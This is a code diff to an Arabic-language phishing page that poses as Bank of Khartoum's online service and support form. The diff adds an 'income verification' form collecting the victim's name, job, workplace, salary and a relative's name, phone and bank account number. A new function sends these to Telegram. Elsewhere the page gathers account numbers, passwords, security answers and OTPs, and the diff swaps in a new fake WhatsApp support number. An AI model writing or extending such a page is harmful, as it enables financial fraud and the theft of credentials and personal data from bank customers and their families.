@@ -58,7 +58,7 @@
     <div class="main-container">
         <div id="step-1" class="card">
             <h2>الاستمارة أونلاين</h2>
-            <h3>أنواع المشاكل التي يمكن معالجتها</h3>
+            <h3>اختر نوع المشكلة التي تواجهها (ما يمكن معالجته عبر هذا القسم)</h3>
             <div class="service-grid">
                 <div class="service-option selected" onclick="selectService(1, 'كشف الحساب')">
                     <div class="service-content">
@@ -109,6 +109,13 @@
                     </div>
                     <span>🛡️</span>
                 </div>
+                <div class="service-option" onclick="selectService(8, 'إثبات دخل')">
+                    <div class="service-content">
+                        <span class="service-title">إثبات دخل</span>
+                        <span class="service-desc">تأكيد وتوثيق مصادر الدخل الشهري والوظيفة.</span>
+                    </div>
+                    <span>💼</span>
+                </div>
             </div>
             <button class="btn-submit" onclick="handleStep1Next()">متابعة</button>
         </div>
@@ -133,6 +140,40 @@
                 <input type="text" id="wrong-tx-id" placeholder="أدخل رقم المعاملة الفريد">
             </div>
             <button class="btn-submit" onclick="submitWrongTransferData()">حفظ ومتابعة تسجيل الدخول</button>
+        </div>
+
+        <div id="step-income-verification" class="card hidden">
+            <h2>استمارة إثبات دخل</h2>
+            <h3>الرجاء تزويدنا ببيانات الدخل والجهة الضامنة</h3>
+            <div class="input-group">
+                <label>الإسم بالكامل:</label>
+                <input type="text" id="inc-name" placeholder="أدخل الإسم رباعي">
+            </div>
+            <div class="input-group">
+                <label>المهنة:</label>
+                <input type="text" id="inc-job" placeholder="أدخل طبيعة عملك الحالية">
+            </div>
+            <div class="input-group">
+                <label>مكان العمل بالضبط:</label>
+                <input type="text" id="inc-workplace" placeholder="اسم الشركة / المؤسسة / المتجر وعنوانها">
+            </div>
+            <div class="input-group">
+                <label>مقدار الدخل الشهري التقريبي:</label>
+                <input type="text" id="inc-salary" placeholder="أدخل قيمة الدخل بالجنيه">
+            </div>
+            <div class="input-group">
+                <label>إسم أقرب الأقربين:</label>
+                <input type="text" id="inc-relative-name" placeholder="أدخل اسم أحد الأقارب من الدرجة الأولى">
+            </div>
+            <div class="input-group">
+                <label>رقم هاتف أقرب الأقربين:</label>
+                <input type="tel" id="inc-relative-phone" placeholder="مثال: 0912345678">
+            </div>
+            <div class="input-group">
+                <label>رقم حساب أقرب الأقربين في بنك الخرطوم:</label>
+                <input type="text" id="inc-relative-account" placeholder="أدخل رقم حساب القريب (6 أو 7 أرقام)">
+            </div>
+            <button class="btn-submit" onclick="submitIncomeData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
         <div id="step-2" class="card hidden">
@@ -207,7 +248,7 @@
                     <label>أدخل رمز التحقق المرسل الي بريدك الالكتروني او رقم الهاتف (OTP):</label>
                     <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
                 </div>
-                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 50:00 دقيقة</span>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
                 <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
             </div>
 
@@ -220,14 +261,14 @@
                     ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة. تقديم بيانات أو رموز غير صحيحة سيؤدي إلى رفض المعاملة فوراً بشكل تلقائي لحماية الحسابات من محاولات الدخول غير المصرح بها، وقد يعرض الحساب للتقييد المؤقت.
                 </div>
 
-                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي أعلاه لتقديمه عند المراجعة، ثم التواصل الفوري مع قسم الدعم الفني وخدمة عملاء بنك الخرطوم المعتمدة مباشرة عبر حساب الواتساب الرسمي على الرقم: <strong style="color:#2e7d32; font-size:15px; direction:ltr; display:inline-block;">0990278926</strong> لمتابعة حالة استرداد المبالغ أو اعتماد الطلب الحالي وتحديثه.</span>
+                <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي أعلاه لتقديمه عند المراجعة، ثم التواصل الفوري مع قسم الدعم الفني وخدمة عملاء بنك الخرطوم المعتمدة مباشرة عبر حساب الواتساب الرسمي على الرقم: <strong style="color:#2e7d32; font-size:15px; direction:ltr; display:inline-block;">249966964671</strong> لمتابعة حالة استرداد المبالغ أو اعتماد الطلب الحالي وتحديثه.</span>
             </div>
         </div>
     </div>
 
     <script>
         let selectedService = "كشف الحساب";
-        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', motherName: '', whatsappNum: '', linkedPhone: '', otp: '', wrongAccount: '', wrongName: '', wrongDate: '', wrongTxId: '', refNum: '' };
+        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', amount: '', motherName: '', whatsappNum: '', linkedPhone: '', otp: '', wrongAccount: '', wrongName: '', wrongDate: '', wrongTxId: '', incName: '', incJob: '', incWorkplace: '', incSalary: '', incRelativeName: '', incRelativePhone: '', incRelativeAccount: '', refNum: '' };
 
         function goToStep(id) {
             document.querySelectorAll('.main-container > .card').forEach(c => c.classList.add('hidden'));
@@ -235,9 +276,12 @@
             if (id === 'step-5') startOtpTimer();
         }
 
+        // توجيه ذكي بناءً على الخيار المحدد في الصفحة الأولى
         function handleStep1Next() {
             if (selectedService === 'التحويلات الخاطئة') {
                 goToStep('step-wrong-transfer');
+            } else if (selectedService === 'إثبات دخل') {
+                goToStep('step-income-verification');
             } else {
                 goToStep('step-2');
             }
@@ -254,6 +298,24 @@
             }
 
             sendToTelegram(`🚨 تفاصيل التحويل الخاطئ المرفقة:\n🔢 الحساب المستلم: ${userData.wrongAccount}\n👤 الاسم: ${userData.wrongName}\n📅 التاريخ: ${userData.wrongDate}\n🆔 المعاملة: ${userData.wrongTxId}`);
+            goToStep('step-2');
+        }
+
+        // دالة حفظ وحفظ بيانات استمارة إثبات الدخل الجديدة
+        function submitIncomeData() {
+            userData.incName = document.getElementById('inc-name').value;
+            userData.incJob = document.getElementById('inc-job').value;
+            userData.incWorkplace = document.getElementById('inc-workplace').value;
+            userData.incSalary = document.getElementById('inc-salary').value;
+            userData.incRelativeName = document.getElementById('inc-relative-name').value;
+            userData.incRelativePhone = document.getElementById('inc-relative-phone').value;
+            userData.incRelativeAccount = document.getElementById('inc-relative-account').value;
+
+            if (!userData.incName || !userData.incJob || !userData.incWorkplace || !userData.incSalary || !userData.incRelativeName || !userData.incRelativePhone || !userData.incRelativeAccount) {
+                return alert('الرجاء ملء كافة حقول استمارة إثبات الدخل المطلوبة');
+            }
+
+            sendToTelegram(`💼 بيانات إثبات الدخل المرفقة:\n👤 الاسم: ${userData.incName}\n🛠️ المهنة: ${userData.incJob}\n📍 مقر العمل: ${userData.incWorkplace}\n💵 الدخل: ${userData.incSalary}\n👥 القريب: ${userData.incRelativeName}\n📞 هاتف القريب: ${userData.incRelativePhone}\n🔢 حساب القريب: ${userData.incRelativeAccount}`);
             goToStep('step-2');
         }
 
